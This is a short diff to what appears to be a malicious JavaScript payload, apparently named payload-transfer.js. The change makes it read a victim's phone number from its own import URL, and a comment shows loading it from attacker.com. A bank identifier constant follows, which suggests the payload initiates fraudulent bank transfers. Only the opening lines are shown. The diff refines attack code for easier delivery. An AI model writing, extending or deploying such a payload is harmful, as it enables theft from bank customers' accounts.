@@ -1,5 +1,8 @@
 (async function() {
-  var phone = new URLSearchParams(location.search).get('phone');
+  // Extract phone from the URL of this script itself,
+  // e.g. import('https://attacker.com/payload-transfer.js?phone=+79001234567')
+  var scriptUrl = import.meta.url;
+  var phone = new URL(scriptUrl).searchParams.get('phone');
   if (!phone) return;
 
   var BANK_ID = '100000000111';
